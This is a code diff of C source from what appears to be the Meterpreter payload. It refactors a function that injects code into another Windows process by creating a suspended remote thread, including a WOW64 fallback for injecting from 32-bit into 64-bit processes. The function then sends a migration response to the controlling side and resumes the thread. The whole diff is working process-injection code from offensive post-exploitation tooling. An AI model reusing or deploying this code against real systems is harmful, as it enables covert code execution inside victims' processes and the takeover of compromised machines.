@@ -1,5 +1,6 @@
 #include "common.h"
 #include "base_inject.h"
+#include "../remote_thread.h"
 #include "./../../../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
 #include <Tlhelp32.h>
 
@@ -420,59 +421,64 @@ DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPV
 /*
  * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
  */
-DWORD inject_via_remotethread( Remote * remote, Packet * response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter )
+DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
 {
-	DWORD dwResult    = ERROR_SUCCESS;
+	DWORD dwResult = ERROR_SUCCESS;
 	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
-	HANDLE hThread    = NULL;
-	DWORD dwThreadId  = 0;
+	HANDLE hThread = NULL;
 
 	do
 	{
 		// Create the thread in the remote process. Create suspended in case the call to CreateRemoteThread
 		// fails, giving us a chance to try an alternative method or fail migration gracefully.
-		hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, CREATE_SUSPENDED, &dwThreadId );
-		if( !hThread )
+		hThread = create_remote_thread(hProcess, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
+		if (!hThread)
 		{
-			if( dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64 )
+			if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
 			{
-				// injecting x86(wow64)->x64, (we expect the call to kernel32!CreateRemoteThread to fail and bring us here).
-
 				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;
 
-				if( inject_via_remotethread_wow64( hProcess, lpStartAddress, lpParameter, &hThread ) != ERROR_SUCCESS )
-					BREAK_ON_ERROR( "[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed" )
+				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
+				{
+					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
+				}
 			}
 			else
 			{
-				BREAK_ON_ERROR( "[INJECT] inject_via_remotethread: CreateRemoteThread failed" )
+				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
 			}
 		}
-
-		if( remote && response )
+		else
 		{
-			dprintf("[INJECT] inject_via_remotethread: Sending a migrate response..." );
-			// Send a successful response to let the ruby side know that we've pretty
-			// much successfully migrated and have reached the point of no return
-			packet_add_tlv_uint( response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique );
-			packet_transmit_response( ERROR_SUCCESS, remote, response );
-
-			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds..." );
-			// Sleep to give the remote side a chance to catch up...
-			Sleep( 2000 );
+			dprintf("[INJECT] inject_via_remotethread: succeeded");
 		}
 
-		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread..." );
+		if (remote && response)
+		{
+			dprintf("[INJECT] inject_via_remotethread: Sending a migrate response...");
+			// Send a successful response to let the ruby side know that we've pretty
+			// much successfully migrated and have reached the point of no return
+			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
+			packet_transmit_response(ERROR_SUCCESS, remote, response);
+
+			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
+			// Sleep to give the remote side a chance to catch up...
+			Sleep(2000);
+		}
+
+		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
 		// Resume the injected thread...
-		if( ResumeThread( hThread ) == (DWORD)-1 )
-			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread: ResumeThread failed" )
+		if (ResumeThread(hThread) == (DWORD)-1)
+			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
 
-	} while( 0 );
+	} while (0);
 
-	if( hThread )
-		CloseHandle( hThread );
+	if (hThread)
+	{
+		CloseHandle(hThread);
+	}
 
-	SetLastError( dwResult );
+	SetLastError(dwResult);
 
 	return dwResult;
 }
